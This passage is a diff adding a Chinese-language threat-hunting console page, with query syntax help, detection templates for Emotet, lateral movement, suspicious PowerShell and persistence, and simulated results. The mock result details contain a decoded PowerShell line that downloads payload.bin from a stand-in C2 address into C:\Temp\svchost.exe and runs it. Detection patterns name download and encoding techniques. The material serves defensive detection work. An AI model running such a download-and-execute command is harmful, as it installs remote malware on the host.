+                <button class="modal-close" onclick="closeResultDetailsModal()">&times;</button>
+            </div>
+            <div class="modal-body" id="result-details-content">
+                <!-- 结果详情内容将通过JavaScript动态填充 -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-outline" onclick="closeResultDetailsModal()">关闭</button>
+                <button class="btn btn-primary" onclick="addResultToInvestigation()">添加到调查</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 查询帮助弹窗 -->
+    <div class="modal" id="queryHelpModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>狩猎查询语法帮助</h3>
+                <button class="modal-close" onclick="closeQueryHelpModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">基本语法结构</h4>
+                    <pre style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-size: 13px; overflow-x: auto;">
+&lt;数据源&gt; 
+[where &lt;筛选条件&gt;]
+[project &lt;要显示的字段&gt;]
+[sort by &lt;排序字段&gt; [asc|desc]]
+[limit &lt;结果数量&gt;]</pre>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">支持的数据源</h4>
+                    <ul style="padding-left: 20px; line-height: 1.6;">
+                        <li><strong>process</strong> - 进程创建和活动事件</li>
+                        <li><strong>network</strong> - 网络连接和流量事件</li>
+                        <li><strong>file</strong> - 文件创建、修改和删除事件</li>
+                        <li><strong>registry</strong> - 注册表操作事件</li>
+                        <li><strong>login</strong> - 用户登录和认证事件</li>
+                        <li><strong>alert</strong> - 系统生成的告警事件</li>
+                    </ul>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">常用运算符</h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <div>
+                            <strong>比较运算符</strong>
+                            <ul style="padding-left: 20px; line-height: 1.6;">
+                                <li><code>==</code> - 等于</li>
+                                <li><code>!=</code> - 不等于</li>
+                                <li><code>&gt;</code> - 大于</li>
+                                <li><code>&lt;</code> - 小于</li>
+                                <li><code>&gt;=</code> - 大于等于</li>
+                                <li><code>&lt;=</code> - 小于等于</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <strong>逻辑运算符</strong>
+                            <ul style="padding-left: 20px; line-height: 1.6;">
+                                <li><code>and</code> - 逻辑与</li>
+                                <li><code>or</code> - 逻辑或</li>
+                                <li><code>not</code> - 逻辑非</li>
+                                <li><code>contains</code> - 包含子字符串</li>
+                                <li><code>startswith</code> - 以指定字符串开头</li>
+                                <li><code>endswith</code> - 以指定字符串结尾</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">示例查询</h4>
+                    <div style="margin-bottom: 15px;">
+                        <div style="font-weight: 500; margin-bottom: 5px;">检测可疑PowerShell命令</div>
+                        <pre style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-size: 13px; overflow-x: auto;">
+process
+where name == "powershell.exe"
+  and (command_line contains "-EncodedCommand" 
+       or command_line contains "-ExecutionPolicy Bypass"
+       or command_line contains "-WindowStyle Hidden")
+project timestamp, host_name, user, command_line
+sort by timestamp desc</pre>
+                    </div>
+                    
+                    <div>
+                        <div style="font-weight: 500; margin-bottom: 5px;">检测与恶意IP的连接</div>
+                        <pre style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-size: 13px; overflow-x: auto;">
+network
+where destination_ip in ("185.234.76.123", "93.184.216.34", "198.51.100.2")
+  and create_time > now(-7d)
+project timestamp, host_name, source_ip, destination_ip, destination_port, process_name
+sort by timestamp desc</pre>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-primary" onclick="closeQueryHelpModal()">我知道了</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 页面加载完成后初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            // 绑定菜单点击事件
+            const menuItems = document.querySelectorAll('.menu-item');
+            menuItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    // 移除所有菜单的active类
+                    menuItems.forEach(menu => menu.classList.remove('active'));
+                    // 给当前点击的菜单添加active类
+                    this.classList.add('active');
+                    
+                    // 更新面包屑
+                    document.getElementById('breadcrumb').textContent = this.querySelector('span').textContent;
+                });
+            });
+
+            // 初始化狩猎趋势图表
+            initHuntingTrendsChart();
+        });
+
+        // 初始化狩猎趋势图表
+        function initHuntingTrendsChart() {
+            const ctx = document.getElementById('huntingTrendsChart').getContext('2d');
+            const chart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: ['8/21', '8/22', '8/23', '8/24', '8/25', '8/26', '8/27'],
+                    datasets: [
+                        {
+                            label: '狩猎任务数',
+                            data: [12, 19, 15, 23, 18, 25, 24],
+                            borderColor: '#3498db',
+                            backgroundColor: 'rgba(52, 152, 219, 0.1)',
+                            tension: 0.3,
+                            fill: true
+                        },
+                        {
+                            label: '发现威胁数',
+                            data: [2, 5, 3, 7, 4, 6, 12],
+                            borderColor: '#e74c3c',
+                            backgroundColor: 'rgba(231, 76, 60, 0.1)',
+                            tension: 0.3,
+                            fill: true
+                        }
+                    ]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'top',
+                        },
+                        title: {
+                            display: true,
+                            text: '近7天狩猎活动趋势'
+                        }
+                    },
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            ticks: {
+                                precision: 0
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        // 切换查询模式（高级查询/条件构建器）
+        function switchQueryMode(mode) {
+            // 更新标签状态
+            document.querySelectorAll('.query-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelector(`.query-tab[onclick="switchQueryMode('${mode}')"]`).classList.add('active');
+            
+            // 显示对应的查询模式
+            if (mode === 'advanced') {
+                document.getElementById('advanced-query').style.display = 'block';
+                document.getElementById('builder-query').style.display = 'none';
+            } else {
+                document.getElementById('advanced-query').style.display = 'none';
+                document.getElementById('builder-query').style.display = 'block';
+                // 生成查询语句
+                generateBuilderQuery();
+            }
+        }
+
+        // 添加查询条件
+        function addCondition() {
+            const container = document.querySelector('.query-builder');
+            const conditionGroup = document.createElement('div');
+            conditionGroup.className = 'condition-group';
+            conditionGroup.innerHTML = `
+                <select class="condition-select">
+                    <option value="process">进程事件</option>
+                    <option value="network">网络事件</option>
+                    <option value="file">文件事件</option>
+                    <option value="registry">注册表事件</option>
+                    <option value="login">登录事件</option>
+                </select>
+                <select class="condition-select">
+                    <option value="name">名称</option>
+                    <option value="path">路径</option>
+                    <option value="command_line">命令行</option>
+                    <option value="user">用户</option>
+                    <option value="pid">进程ID</option>
+                </select>
+                <select class="condition-select">
+                    <option value="contains">包含</option>
+                    <option value="equals">等于</option>
+                    <option value="notequals">不等于</option>
+                    <option value="startswith">以...开始</option>
+                    <option value="endswith">以...结束</option>
+                </select>
+                <input type="text" class="condition-input" placeholder="值">
+                <button class="condition-remove" onclick="removeCondition(this)"><i class="fas fa-times"></i></button>
+            `;
+            
+            // 插入到"添加条件"按钮之前
+            const addButton = document.querySelector('.condition-add');
+            container.insertBefore(conditionGroup, addButton);
+            
+            // 生成查询语句
+            generateBuilderQuery();
+        }
+
+        // 移除查询条件
+        function removeCondition(button) {
+            const conditionGroup = button.closest('.condition-group');
+            // 确保至少保留一个条件
+            if (document.querySelectorAll('.condition-group').length > 1) {
+                conditionGroup.remove();
+                // 生成查询语句
+                generateBuilderQuery();
+            } else {
+                showToast('至少需要保留一个查询条件');
+            }
+        }
+
+        // 生成构建器查询语句
+        function generateBuilderQuery() {
+            const conditions = document.querySelectorAll('.condition-group');
+            if (conditions.length === 0) return;
+            
+            // 获取第一个条件的数据源
+            const dataSource = conditions[0].querySelector('.condition-select').value;
+            let query = `${dataSource}\nwhere `;
+            
+            // 构建条件
+            const conditionParts = [];
+            conditions.forEach((group, index) => {
+                const selects = group.querySelectorAll('.condition-select');
+                const input = group.querySelector('.condition-input').value;
+                
+                if (input.trim() === '') return;
+                
+                const field = selects[1].value;
+                const operator = selects[2].value;
+                const value = isNaN(input) ? `"${input}"` : input;
+                
+                // 转换运算符
+                let op = operator;
+                if (operator === 'equals') op = '==';
+                else if (operator === 'notequals') op = '!=';
+                
+                conditionParts.push(`  ${field} ${op} ${value}`);
+            });
+            
+            // 组合条件
+            query += conditionParts.join('\n  and ');
+            query += '\nsort by timestamp desc';
+            
+            // 更新查询结果框
+            document.getElementById('builder-query-result').value = query;
+        }
+
+        // 运行狩猎查询
+        function runHuntingQuery() {
+            const query = document.getElementById('hunting-query-input').value;
+            if (!query.trim()) {
+                showToast('请输入查询语句');
+                return;
+            }
+            
+            showToast('正在执行狩猎查询...');
+            // 模拟查询执行
+            setTimeout(() => {
+                showToast('狩猎查询已完成，共返回247条结果');
+                // 在实际应用中，这里会更新结果表格
+            }, 1500);
+        }
+
+        // 运行构建器生成的查询
+        function runBuilderQuery() {
+            const query = document.getElementById('builder-query-result').value;
+            if (!query.trim()) {
+                showToast('请添加查询条件');
+                return;
+            }
+            
+            showToast('正在执行狩猎查询...');
+            // 模拟查询执行
+            setTimeout(() => {
+                showToast('狩猎查询已完成，共返回156条结果');
+                // 在实际应用中，这里会更新结果表格
+            }, 1200);
+        }
+
+        // 加载示例查询
+        function loadExampleQuery(id) {
+            let query = '';
+            switch(id) {
+                case 1:
+                    query = `process
+where name == 'powershell.exe'
+  and command_line contains '-EncodedCommand'
+  and user != 'SYSTEM'
+  and create_time > now(-24h)
+project timestamp, name, user, command_line, host_name
+sort by timestamp desc`;
+                    break;
+                case 2:
+                    query = `registry
+where (key_path contains 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+       or key_path contains 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce')
+  and value_data contains 'C:\\Windows\\Temp'
+  and create_time > now(-7d)
+project timestamp, host_name, user, key_path, value_name, value_data
+sort by timestamp desc`;
+                    break;
+                case 3:
+                    query = `network
+where destination_port in (80, 443, 8080)
+  and process_name not in ('chrome.exe', 'firefox.exe', 'edge.exe', 'iexplore.exe')
+  and bytes_sent > 1048576
+  and create_time > now(-48h)
+project timestamp, host_name, source_ip, destination_ip, destination_port, process_name, bytes_sent
+sort by bytes_sent desc`;
+                    break;
+            }
+            document.getElementById('hunting-query-input').value = query;
+        }
+
+        // 加载狩猎模板
+        function loadTemplate(id) {
+            // 根据模板ID加载不同的查询语句
+            let query = '';
+            let templateName = '';
+            
+            switch(id) {
+                case 1:
+                    templateName = 'Emotet恶意软件狩猎';
+                    query = `union process, network, file
+where (process.name == 'svchost.exe' and process.path contains '\\Temp\\')
+   or (network.destination_ip in ('185.234.76.0/24', '93.184.216.0/24'))
+   or (file.path contains '\\Temp\\' and file.name in ('svchost.exe', 'wermgr.exe', 'mshta.exe'))
+   or (registry.key_path contains 'Run' and registry.value_data contains '\\Temp\\')
+project timestamp, type, host_name, user, 
+       coalesce(process.name, network.process_name, file.name, 'n/a') as related_process,
+       coalesce(network.destination_ip, file.path, registry.key_path, 'n/a') as related_artifact
+sort by timestamp desc`;
+                    break;
+                case 2:
+                    templateName = '横向移动检测';
+                    query = `union login, process
+where (login.type == 'remote' and login.success == true and login.source_ip !in ('192.168.1.0/24'))
+   or (process.name in ('wmiprvse.exe', 'powershell.exe', 'cmd.exe') 
+       and process.command_line contains '\\\\' 
+       and process.command_line contains '/c' or process.command_line contains '-Command')
+project timestamp, type, host_name, user, 
+       coalesce(login.source_ip, 'n/a') as source,
+       coalesce(process.command_line, login.logon_type, 'n/a') as details
+sort by timestamp desc`;
+                    break;
+                case 3:
+                    templateName = '可疑PowerShell活动';
+                    query = `process
+where name == 'powershell.exe'
+  and (command_line contains '-EncodedCommand'
+       or command_line contains '-ExecutionPolicy Bypass'
+       or command_line contains '-WindowStyle Hidden'
+       or command_line contains 'Invoke-WebRequest'
+       or command_line contains 'DownloadString'
+       or command_line contains 'FromBase64String')
+  and user not in ('SYSTEM', 'LOCAL SERVICE', 'NETWORK SERVICE')
+project timestamp, host_name, user, command_line, pid
+sort by timestamp desc`;
+                    break;
+                case 4:
+                    templateName = '持久化机制检测';
+                    query = `union registry, process, file
+where (registry.key_path contains 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+       or registry.key_path contains 'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
+       or registry.key_path contains 'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+   or (process.name == 'schtasks.exe' and process.command_line contains '/create')
+   or (file.path contains 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+project timestamp, type, host_name, user,
+       coalesce(registry.key_path, process.command_line, file.path) as artifact,
+       coalesce(registry.value_data, 'n/a') as value
+sort by timestamp desc`;
+                    break;
+            }
+            
+            // 切换到高级查询模式并加载查询
+            switchQueryMode('advanced');
+            document.getElementById('hunting-query-input').value = query;
+            showToast(`已加载模板: ${templateName}`);
+        }
+
+        // 打开新建模板弹窗
+        function openNewTemplateModal() {
+            document.getElementById('newTemplateModal').classList.add('active');
+        }
+
+        // 关闭新建模板弹窗
+        function closeNewTemplateModal() {
+            document.getElementById('newTemplateModal').classList.remove('active');
+        }
+
+        // 保存新模板
+        function saveNewTemplate() {
+            const name = document.getElementById('template-name').value;
+            const query = document.getElementById('template-query').value;
+            
+            if (!name || !query) {
+                showToast('请填写模板名称和查询语句');
+                return;
+            }
+            
+            showToast(`已保存新模板: ${name}`);
+            closeNewTemplateModal();
+            
+            // 清空表单
+            document.getElementById('template-name').value = '';
+            document.getElementById('template-description').value = '';
+            document.getElementById('template-tactics').selectedIndex = -1;
+            document.getElementById('template-query').value = '';
+            document.getElementById('template-tags').value = '';
+        }
+
+        // 保存查询为模板
+        function saveQueryAsTemplate() {
+            // 获取当前查询语句
+            let query = '';
+            if (document.getElementById('advanced-query').style.display !== 'none') {
+                query = document.getElementById('hunting-query-input').value;
+            } else {
+                query = document.getElementById('builder-query-result').value;
+            }
+            
+            if (!query.trim()) {
+                showToast('请先输入或生成查询语句');
+                return;
+            }
+            
+            // 填充到新建模板弹窗
+            document.getElementById('template-query').value = query;
+            document.getElementById('newTemplateModal').classList.add('active');
+        }
+
+        // 显示结果详情
+        function showResultDetails(id) {
+            const detailsContent = document.getElementById('result-details-content');
+            
+            // 模拟不同结果的详情数据
+            const results = {
+                1: {
+                    timestamp: "2025-08-27 15:43:22",
+                    host: "WIN-SERVER-01 (192.168.1.101)",
+                    process: "powershell.exe",
+                    pid: "2456",
+                    ppid: "860",
+                    user: "admin (域管理员)",
+                    path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    command: "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAiBBAHMAQwBvAGMAaABlACAALQBBAHMAQwBvAGMAaABlAFAAYQB0AGgAIAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQB3ADMAMgBcAFcAaW5kb3dzAFBvAHcAZQByAFMAaABlAGwAbAAvAHYAMQAuADAAXABwAG8AdwBlAHIAc2hlbGwALgBlAHgAZQAiADsAIABzAC4AUwBlAGMAaABpAG4AZQBJAGQAIAA9ACAAJwBXAEkATgBTAFMAVgBFAFIATQBCAEkARAAnADsAIABzAC4ARgBpAGwAZQBJAGQAIAA9ACAAJwBBAEkARAAzADIAJwA7ACAAJABzAC4AQQBkAGQARQB4AHAAZQBjaXR5ACgAJwBDADoAXABUAGUAbQBwAFwAJwAsACAAJwBBAEkARAAzADIAJwApADsAIABzAC4ARgBpAGwAZQBWAGEAbAB1AGUAIAA9ACAAJwBDADoAXABUAGUAbQBwAFwAcwB2AGMAaABvc3QALgBlAHgAZQA nADsAIABzAC4ARgBpAGwAZQBWAGEAbAB1AGUAIAA9ACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAHN2AGMAaG9zdC5leGU nADsAIABzAC4ARgBpAGwAZQBWAGEAbAB1AGUAIAA9ACAAJwBBAEkARAAzADIAJwA7ACAAJABzAC4AVwByAGkAdABlACgAKQA7ACAAJABzAC4ASQBuAHAAdQB0ACgAKQA7ACAAJABzAC4ARQB4AHAAdABvAEUAeABwAGUAYwB0AGkAbwBuACgAKQA7ACAAJABzAC4ARQBuAGQAKAApAA==",
+                    decoded: "s = New-Object System.Net.WebClient; s.DownloadFile('http://185.234.76.123:8080/payload.bin', 'C:\\Temp\\svchost.exe'); Start-Process 'C:\\Temp\\svchost.exe'",
+                    parent: "explorer.exe (PID: 860)",
+                    md5: "a7f3d9c2e4b8a1f3e5d7c9b0a2f4e6d8",
+                    sha256: "a7f3d9c2e4b8a1f3e5d7c9b0a2f4e6d8c0b1a3f5e7d9c8b0a1f2e3d4c5b6a7",
+                    risk: "高风险",
+                    reason: "包含编码命令且解码后包含从恶意IP下载文件并执行的行为，符合Emotet恶意软件特征"
+                }
+                // 可以添加更多结果详情...
+            };
+            
+            // 获取结果数据，默认使用ID=1的数据
+            const result = results[id] || results[1];
+            
+            // 构建详情HTML
+            let detailsHtml = `
+                <div style="margin-bottom: 20px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                        <h4 style="color: #2c3e50;">${result.process} 活动详情</h4>
+                        <span class="severity ${result.risk === '高风险' ? 'severity-high' : 'severity-medium'}">${result.risk}</span>
+                    </div>
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                        <div>
+                            <div style="font-size: 13px; color: #666;">时间戳</div>
+                            <div style="font-weight: 500;">${result.timestamp}</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 13px; color: #666;">主机</div>
+                            <div style="font-weight: 500;">${result.host}</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 13px; color: #666;">进程ID</div>
+                            <div style="font-weight: 500;">${result.pid} (父进程: ${result.ppid})</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 13px; color: #666;">用户</div>
+                            <div style="font-weight: 500;">${result.user}</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">进程路径</h4>
+                    <div style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 13px; overflow-x: auto;">
+                        ${result.path}
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">命令行</h4>
+                    <div style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 13px; overflow-x: auto; margin-bottom: 10px;">
+                        ${result.command}
+                    </div>
+                    
+                    <div>
+                        <h5 style="margin-bottom: 5px; color: #495057;">解码后的命令</h5>
+                        <div style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 13px; overflow-x: auto; border-left: 3px solid #e74c3c;">
+                            ${result.decoded}
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">文件哈希</h4>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <div>
+                            <div style="font-size: 13px; color: #666;">MD5</div>
+                            <div style="font-family: monospace; font-size: 13px;">${result.md5}</div>
+                        </div>
+                        <div>
+                            <div style="font-size: 13px; color: #666;">SHA256</div>
+                            <div style="font-family: monospace; font-size: 13px;">${result.sha256}</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="margin-bottom: 10px;">
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">风险评估</h4>
+                    <div style="background-color: #f8fafc; padding: 10px; border-radius: 4px; font-size: 14px; line-height: 1.6;">
+                        ${result.reason}
+                    </div>
+                </div>
+                
+                <div>
+                    <h4 style="margin-bottom: 10px; color: #2c3e50;">关联信息</h4>
+                    <ul style="padding-left: 20px; font-size: 14px; line-height: 1.6;">
+                        <li>IP地址 185.234.76.123 在威胁情报库中标记为Emotet C2服务器</li>
+                        <li>文件哈希 ${result.sha256.substring(0, 16)}... 未在已知威胁库中找到匹配</li>
+                        <li>用户 "admin" 具有管理员权限，该进程活动可能导致严重影响</li>
+                    </ul>
+                </div>
+            `;
+            
+            detailsContent.innerHTML = detailsHtml;
+            document.getElementById('resultDetailsModal').classList.add('active');
+        }
+
+        // 关闭结果详情弹窗
+        function closeResultDetailsModal() {
+            document.getElementById('resultDetailsModal').classList.remove('active');
+        }
+
+        // 添加结果到调查
+        function addResultToInvestigation() {
+            showToast('已将结果添加到新调查会话');
+            closeResultDetailsModal();
+            // 在实际应用中，这里会跳转到调查页面或创建新的调查会话
+        }
+
+        // 从结果创建调查
+        function createInvestigationFromResults() {
+            showToast('已基于当前狩猎结果创建新调查会话');
+            // 在实际应用中，这里会跳转到调查页面
+        }
+
+        // 显示查询帮助
+        function showQueryHelp() {
+            document.getElementById('queryHelpModal').classList.add('active');
+        }
+
+        // 关闭查询帮助
+        function closeQueryHelpModal() {
+            document.getElementById('queryHelpModal').classList.remove('active');
+        }
+
+        // 更改结果视图
+        function changeResultsView(viewType) {
+            showToast(`已切换到${viewType === 'table' ? '表格' : viewType === 'chart' ? '图表' : '原始'}视图`);
+            // 在实际应用中，这里会切换不同的结果展示方式
+        }
+
+        // 导出结果
+        function exportResults() {
+            showToast('正在导出结果数据...');
+            setTimeout(() => {
+                showToast('结果已导出为CSV文件');
+            }, 1000);
+        }
+
+        // 保存结果
+        function saveResults() {
+            showToast('狩猎结果已保存到历史记录');
+        }
+
+        // 显示提示消息
+        function showToast(message) {
+            // 检查是否已有toast，如有则移除
+            const existingToast = document.querySelector('.toast');
+            if (existingToast) {
+                existingToast.remove();
+            }
+            
+            // 创建新toast
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            // 3秒后移除
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
+    
